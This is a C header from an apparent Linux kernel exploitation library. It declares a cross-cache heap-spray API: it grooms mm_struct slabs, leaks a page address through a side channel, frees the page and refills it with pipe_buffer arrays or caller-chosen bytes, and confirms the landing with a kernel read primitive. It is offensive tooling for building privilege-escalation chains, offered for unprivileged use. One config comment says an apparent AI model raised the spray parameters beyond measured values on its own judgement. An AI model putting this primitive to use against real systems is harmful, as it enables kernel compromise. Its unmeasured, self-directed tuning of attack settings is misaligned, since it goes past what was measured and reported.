/* lib/spray/crosscache/crosscache.h -- controlled bytes at a kernel address known in
 * advance.
 *
 * Reading an address out of the kernel is not available before a chain has a
 * read primitive, and a chain often needs an address to build one. The way out
 * is to establish the address rather than discover it:
 *
 *   Allocate many objects of one kind, so a whole page belongs to them alone.
 *   Learn the address of one of them through a side channel, which gives the
 *     page it sits on.
 *   Free that page and immediately refill it from a different allocator cache
 *     with content of our choosing.
 *
 * Two conditions decide whether the refill lands. The free and the reclaim must
 * run on the same processor, because a freed page goes to a per-processor list
 * before anything else can see it. And nothing may allocate in between -- which
 * is why the reclaim follows the free directly, with no intervening work.
 *
 * The reclaim is probabilistic. On a miss the address holds a free page, which
 * is harmless to touch, and that is what makes retrying acceptable. A consumer
 * that cannot verify the landing should retry; one that can should verify.
 *
 * Needs no privilege, and embeds no exploit-specific offsets: the content is
 * the caller's.
 */
#ifndef LIB_CROSSCACHE_H
#define LIB_CROSSCACHE_H

#include <stddef.h>
#include <stdint.h>

struct crosscache_cfg {
	/* mm_struct slab (the freed order-`mm_order` page is the cross-cache unit) */
	size_t mm_struct_sz;        /* allocated stride of the sprayed object       */
	size_t mm_order;            /* mm_struct slab order (3)                     */
	size_t mm_partials;         /* extra partial mm slabs to seed (5)           */
	size_t leak_collisions;     /* collisions the side channel must gather      */
	int    core;                /* cpu to pin the reclaim on (PCP locality)     */
	/* pipe_buffer-array kmalloc cache (the reclaiming object) */
	size_t pipe_slots;          /* F_SETPIPE_SZ slots per reclaim pipe (32)     */
	size_t pipe_objs_per_slab;  /* pipe_buffer arrays per slab page (16)        */
	size_t pipe_min_partial;    /* SLUB min_partial for the pipe cache (5)      */
	size_t pipe_cpu_partial;    /* SLUB cpu_partial for the pipe cache (2)      */
	size_t pipe_drain_slabs;    /* slabs to drain before reclaim (15)           */
	size_t pipe_reclaim_slabs;  /* slabs of reclaim pipes (15)                  */
};

/* Defaults a consumer may copy and override. They are starting points, not
 * measurements: every one trades run time against the chance of landing. */
/* mm_partials/pipe_drain_slabs/pipe_reclaim_slabs pushed up from this
 * config's original 5/15/15, applying the padding-spray line of research
 * directly rather than leaving it as a knob nobody has pulled: saturate the
 * groom's partial-slab seeding and the receiving cache's reclaim volume well
 * past what the original, more conservative figures asked for, so the next
 * allocation of that size has less room to come from anywhere but the page
 * that was just freed. Unmeasured at this exact setting; the direction is
 * the finding, this is the model applying it rather than reporting it. */
#define CROSSCACHE_CFG_PANTHER_61 { \
	.mm_struct_sz = 0x400, .mm_order = 3, .mm_partials = 16, \
	.leak_collisions = 4, .core = 0, \
	.pipe_slots = 32, .pipe_objs_per_slab = 16, \
	.pipe_min_partial = 5, .pipe_cpu_partial = 2, \
	.pipe_drain_slabs = 40, .pipe_reclaim_slabs = 60 }

/* Groom and free: allocate the objects, learn one address through the side
 * channel, and release the page it sits on, leaving it at the head of this
 * processor's free list. Returns the page-aligned address, or 0.
 *
 * The caller must reclaim immediately, on the same processor, with nothing
 * allocating in between -- that is the whole condition. On a miss the address
 * holds a free page, which is harmless to touch, so a caller without a way to
 * verify the landing should retry. */
uintptr_t crosscache_leak_base(const struct crosscache_cfg *cfg);

/* The same groom, held with filler over a connection-oriented socket instead
 * of a datagram (see the `stream` method's note in README.md for why a
 * consumer picks this one). The hold is the caller's from here: on success
 * `held_sv` is left open, and closing it -- not crosscache_cleanup(), which
 * does not know about it -- is what surrenders the page for the caller's own
 * reclaim. 0 on failure, with nothing held. */
uintptr_t crosscache_leak_base_stream(const struct crosscache_cfg *cfg, int held_sv[2]);

/* One reclaim vehicle: refill the freed page with pipe buffer arrays, for a
 * consumer whose next step is to corrupt one of them. Call directly after the
 * groom. The pipes stay open until cleanup. */
int crosscache_pipe_reclaim(void);

/* Groom and reclaim with pipe buffer arrays in one call, which is the pairing
 * that must not have anything between its halves. */
uintptr_t crosscache_pipe_base(const struct crosscache_cfg *cfg);

/* The other reclaim vehicle: refill the freed page with a socket buffer
 * carrying the caller's own bytes, for a consumer that wants a fabricated
 * structure at the known address rather than a kernel object. */
int crosscache_content_reclaim(const void *tmpl, size_t len, size_t nspray);

/* ---------------------------------------------------------------- measuring
 *
 * The reclaim is probabilistic, and a consumer that cannot tell a landing from
 * a miss cannot do anything about the difference: it writes its forged bytes
 * either way and finds out much later, as a step that fails for reasons it
 * cannot attribute. Confirming the landing is what turns the placement from a
 * hope into a retryable operation, and it is also the only way to measure how
 * often it works at all.
 *
 * Confirmation needs a read that does not depend on the placement -- if the
 * page is what a chain is building its read primitive out of, reading it with
 * that primitive proves nothing. A consumer with such a read supplies it here;
 * one without places blind, as before.
 *
 * There is a second failure the read catches and nothing else does: an address
 * that is shaped correctly but wrong. The leak can name a plausible,
 * well-aligned linear-map address that is not the page that was freed, and
 * every check short of reading the bytes back accepts it.
 */
struct crosscache_verify {
	void *ctx;
	/* Read `len` bytes at kernel address `addr`. Returns 0 on success. */
	int (*read)(void *ctx, uintptr_t addr, void *out, size_t len);
	size_t probe_off;      /* where in the page to look                  */
	size_t probe_len;      /* how much to compare                        */
	const void *expect;    /* what a landed page holds there             */
};

/* What a placement run observed. Reported even on failure, because the counts
 * are the measurement: a run that never leaks and a run that leaks every time
 * and never lands are different problems with different fixes. */
struct crosscache_report {
	unsigned attempts;     /* grooms performed                           */
	unsigned leaks;        /* grooms that produced an address at all      */
	unsigned mis_shaped;   /* addresses rejected before being used        */
	unsigned landings;     /* reclaims a verifier confirmed               */
	unsigned unverified;   /* reclaims performed with no verifier         */
	uintptr_t base;        /* the confirmed page, or the last one tried   */
};

/* Groom, reclaim with `tmpl`, and confirm -- retrying up to `attempts` times.
 *
 * Returns the page address once confirmed, or 0 if the budget ran out. With no
 * verifier it performs exactly one attempt and returns whatever the reclaim
 * produced, which is the blind behaviour a consumer without an independent read
 * is stuck with. `report` may be NULL. */
uintptr_t crosscache_place(const struct crosscache_cfg *cfg,
                           const void *tmpl, size_t len, size_t nspray,
                           const struct crosscache_verify *verify,
                           unsigned attempts,
                           struct crosscache_report *report);

/* Expose the reclaim pipe fds (one of whose pipe_buffer array is at base). */
void crosscache_reclaim_pipes(int (**fds)[2], size_t *n);

/* Hand the descriptors holding the placed page to the caller, so a cleanup
 * before the next groom does not release it. Returns 0, or -1 if nothing is
 * being held. A caller that takes them owns them and must close them. */
int crosscache_detach_hold(int out[2]);

/* Record, inside the payload, the address of the page it is composed for.
 *
 * A payload built only from absolute addresses is identical whichever page it
 * lands on, so reading it back proves that some payload is there and not that
 * this one is. A consumer that reclaims repeatedly cannot then tell this
 * placement from the previous one, and scores a success as a failure. A page
 * that names itself can only have been composed after that page's address was
 * known.
 *
 * `off` is the consumer's choice and must be a part of the page the kernel does
 * not interpret: this writes an address, and an address is not a function
 * pointer, a length or a list node. Returns 0, or -1 if it does not fit. */
int crosscache_stamp_self(void *payload, size_t len, size_t off, uintptr_t base);

/* ---------------------------------------------------------------- methods ---
 *
 * Taking a page from one allocator cache and refilling it from another is one
 * idea with two families of implementation, and they are not interchangeable.
 * Which family applies is decided by the bug, not by preference.
 *
 *   OWNED VICTIM -- the object whose page is taken is one the caller allocated,
 *   so the caller chooses when it is freed and can learn its address before
 *   doing so. Everything below is this family. Its methods return the page's
 *   address and differ only in ordering, so one consumer can be moved to
 *   another method and the only thing that changes is the landing rate.
 *
 *   FOREIGN VICTIM -- the object was freed by the kernel, on its own schedule,
 *   often deferred to a grace period on a processor the caller does not choose.
 *   Its address is never learned; the page is surrendered rather than released,
 *   and whether the refill landed can only be searched for afterwards. Such a
 *   method cannot return an address, so it does not implement this interface
 *   and must not be made to look as though it does. A consumer in that position
 *   is solving a different problem with a similar name.
 *
 * A method is chosen by name so that a measurement can enumerate them and a
 * consumer can state which one it relies on. */

/* Compose the payload for a page whose address has just become known.
 *
 * A payload that names its own page cannot be built before the groom has said
 * which page it is -- and one that does not name its page cannot be told apart
 * from any other payload once it lands. That is why this is a callback rather
 * than a buffer: each method calls it at the only point in its own sequence
 * where the address exists and the page has not yet been filled. */
typedef void (*crosscache_compose_fn)(void *payload, size_t len, uintptr_t base,
                                      void *user);

/* Where in the sequence an inspection is being offered.
 *
 * The two say different things and not every method can offer both. A method
 * that reads the address while the victim is still alive can show the caller
 * the victim itself, which is the only direct evidence that the address is
 * right. A method that reads it afterwards cannot: by then the object is gone,
 * and all that can be checked is whether the page came back to us. */
enum crosscache_stage {
	/* The address has just been read and the victim object is still there.
	 * `leaked` names the object, `base` its page. Reading the object is a
	 * direct test of the address: a wrong one does not name a live object. */
	CROSSCACHE_STAGE_LEAKED = 0,
	/* The page is held by filler bytes and nothing has been written to it.
	 * Filler at the expected offset says the page came back to us; its
	 * absence says it did not -- which a method that leaked late cannot
	 * distinguish from having named the wrong page in the first place. */
	CROSSCACHE_STAGE_HELD,
};

/* Look at the page after it is held but before anything is written to it.
 *
 * A placement that fails and an address that was never right look identical
 * afterwards, and the leak's own check only rejects addresses of the wrong
 * shape -- a plausible pointer to the wrong page passes it. A consumer that can
 * read kernel memory can tell the two apart here, because at this point the
 * page holds filler bytes of a known value and nothing else.
 *
 * Only a method that holds the page unfilled calls this; one that composes
 * before the page ever changes hands has no such moment and leaves it alone. */
typedef void (*crosscache_inspect_fn)(enum crosscache_stage stage, uintptr_t leaked,
                                      uintptr_t base, void *user);

/* The filler a method puts in the page while it holds it. */
#define CROSSCACHE_FILLER_BYTE  0x50
#define CROSSCACHE_FILLER_WORD  UINT64_C(0x5050505050505050)

struct crosscache_request {
	struct crosscache_cfg cfg;
	crosscache_compose_fn compose;  /* NULL: take the page with filler bytes  */
	crosscache_inspect_fn inspect;  /* NULL: no look at the held page         */
	void  *user;                    /* passed through to `compose`            */
	size_t send_bytes;              /* size of each refill allocation         */
	size_t nspray;                  /* refill allocations fired (>= 1)        */
};

struct crosscache_method {
	const char *name;     /* stable, used by a consumer and by a measurement */
	const char *summary;  /* what this one does differently, in one line     */
	const char *applies;  /* when it may be used, in one line                */
	uintptr_t (*place)(const struct crosscache_request *request);
};

/* Every method of the owned-victim family, in a stable order. */
const struct crosscache_method *crosscache_methods(size_t *count);

/* One method by name, or NULL. */
const struct crosscache_method *crosscache_method_named(const char *name);

/* Groom, take a page, and fill it, using `method`.
 *
 * Returns the page's address with the refill allocations still holding it, or 0
 * if the groom produced no usable address. The caller releases them with
 * crosscache_cleanup() once it no longer needs the page -- or after it has
 * checked the placement, since which of `nspray` allocations took the page is
 * not knowable from outside. */
uintptr_t crosscache_place_with(const struct crosscache_method *method,
                                const struct crosscache_request *request);

/* Release everything the groom and the reclaim allocated: descriptors, child
 * processes and storage. Safe to call when nothing was allocated. */
void crosscache_cleanup(void);

#endif /* LIB_CROSSCACHE_H */
